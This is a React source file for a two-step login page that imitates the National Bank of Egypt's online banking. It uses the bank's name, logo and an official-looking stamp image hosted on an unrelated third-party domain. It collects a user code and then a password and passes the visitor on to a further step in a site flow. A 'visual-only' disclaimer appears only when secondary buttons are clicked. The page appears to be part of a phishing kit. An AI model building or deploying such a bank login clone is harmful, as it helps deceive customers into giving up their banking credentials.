import { FormEvent, useState } from "react";
import { ArrowRight, Building2, Eye, EyeOff, Globe2, Menu, UserRound } from "lucide-react";
import { Link, useLocation } from "wouter";
import { formatLoginGreeting, nextVisualStep } from "@/siteFlow";

const logoSrc = "https://nbewatches-5ewamt7h.manus.space/manus-storage/nbe-logo-clean_640cbc86.png";
const stampImageSrc = "https://nbewatches-5ewamt7h.manus.space/manus-storage/IMG-20260815-WA0117_9642385b.jpg";

type Lang = "ar" | "en";
type LoginStep = "user" | "password";
type AccountType = "individual" | "business";

export default function Login() {
  const [, navigate] = useLocation();
  const [lang, setLang] = useState<Lang>("ar");
  const [step, setStep] = useState<LoginStep>("user");
  const [accountType, setAccountType] = useState<AccountType>("individual");
  const [showPassword, setShowPassword] = useState(false);
  const [userCode, setUserCode] = useState("");
  const [password, setPassword] = useState("");
  const [demoMessage, setDemoMessage] = useState(false);
  const [requestName] = useState(() => {
    try { return window.sessionStorage.getItem("nbe_request_name")?.trim() || ""; } catch { return ""; }
  });
  const isAr = lang === "ar";
  const copy = isAr ? {
    individuals: "أفراد", business: "شركات", userCode: "كود المستخدم", password: "كلمة المرور",
    forgotCode: "نسيت كود المستخدم؟", forgotPassword: "نسيت كلمة المرور؟", signIn: "تسجيل الدخول",
    register: "سجل الآن", join: "انضم إلى عملاء البنك الأهلي المصري", back: "العودة إلى كود المستخدم",
    menu: "القائمة", show: "إظهار كلمة المرور", hide: "إخفاء كلمة المرور",
    demo: "هذه واجهة تجريبية فقط وسيتم ربطها بالمزود الرسمي لاحقًا.", passwordHint: "أدخل كلمة المرور الخاصة بك",
  } : {
    individuals: "Individuals", business: "Companies", userCode: "User code", password: "Password",
    forgotCode: "Forgot user code?", forgotPassword: "Forgot password?", signIn: "Sign in",
    register: "Register now", join: "Join NBE customers", back: "Back to user code",
    menu: "Menu", show: "Show password", hide: "Hide password",
    demo: "This is a visual-only interface and will be connected to the official provider later.", passwordHint: "Enter your password",
  };
  const greeting = formatLoginGreeting(requestName, lang);

  function submitUserCode(event: FormEvent) {
    event.preventDefault();
    setDemoMessage(false);
    setStep("password");
  }

  function submitPassword(event: FormEvent) {
    event.preventDefault();
    navigate(nextVisualStep("login"));
  }

  return <div className={isAr ? "login-page official-login rtl" : "login-page official-login ltr"} dir={isAr ? "rtl" : "ltr"}>
    <header className="official-login-header">
      <Link href="/" className="official-login-brand"><img src={logoSrc} alt="البنك الأهلي المصري" /></Link>
      <div className="official-login-header-actions">
        <button className="official-language" type="button" onClick={() => setLang(isAr ? "en" : "ar")}><Globe2 size={17} />{isAr ? "English" : "العربية"}</button>
        <button className="official-menu" type="button" aria-label={copy.menu}><Menu size={23} /></button>
      </div>
    </header>

    <main className="official-login-main">
      <section className="official-login-card" aria-label={isAr ? "تسجيل الدخول" : "Sign in"}>
        <img className="official-card-logo" src={logoSrc} alt="National Bank of Egypt" />
        {step === "user" ? <>
          <div className="official-account-tabs" role="tablist" aria-label={isAr ? "نوع الحساب" : "Account type"}>
            <button type="button" className={accountType === "individual" ? "is-active" : ""} onClick={() => setAccountType("individual")}><UserRound size={22} /><span>{copy.individuals}</span></button>
            <button type="button" className={accountType === "business" ? "is-active" : ""} onClick={() => setAccountType("business")}><Building2 size={22} /><span>{copy.business}</span></button>
          </div>
          <p className="official-login-greeting">{greeting}</p>
          <h1 className="official-login-title">{copy.userCode}</h1>
          <form className="official-login-form" onSubmit={submitUserCode}>
            <label className="official-field"><span>{copy.userCode}</span><input value={userCode} onChange={(event) => setUserCode(event.target.value)} aria-label={copy.userCode} autoComplete="off" placeholder={copy.userCode} /></label>
            <button className="official-forgot" type="button" onClick={() => setDemoMessage(true)}>{copy.forgotCode}</button>
            <button className="official-submit" type="submit">{copy.signIn}</button>
            <button className="official-register" type="button" onClick={() => setDemoMessage(true)}>{copy.register}</button>
            <p className="official-join">{copy.join}</p>
            {demoMessage && <p className="official-demo" role="status">{copy.demo}</p>}
          </form>
        </> : <>
          <button className="official-back" type="button" onClick={() => setStep("user")}><ArrowRight size={17} />{copy.back}</button>
          <p className="official-login-greeting">{greeting}</p>
          <h1 className="official-login-title">{copy.password}</h1>
          <div className="official-stamp-frame"><img src={stampImageSrc} alt={isAr ? "ختم البنك الأهلي المصري" : "NBE stamp"} /></div>
          <form className="official-login-form" onSubmit={submitPassword}>
            <label className="official-field official-password-field"><span>{copy.password}</span><input value={password} onChange={(event) => setPassword(event.target.value)} aria-label={copy.password} type={showPassword ? "text" : "password"} autoComplete="off" placeholder={copy.passwordHint} /><button type="button" onClick={() => setShowPassword(!showPassword)} aria-label={showPassword ? copy.hide : copy.show}>{showPassword ? <EyeOff size={20} /> : <Eye size={20} />}</button></label>
            <button className="official-forgot" type="button" onClick={() => setDemoMessage(true)}>{copy.forgotPassword}</button>
            <button className="official-submit" type="submit">{copy.signIn}</button>
            {demoMessage && <p className="official-demo" role="status">{copy.demo}</p>}
          </form>
        </>}
      </section>
    </main>
  </div>;
}
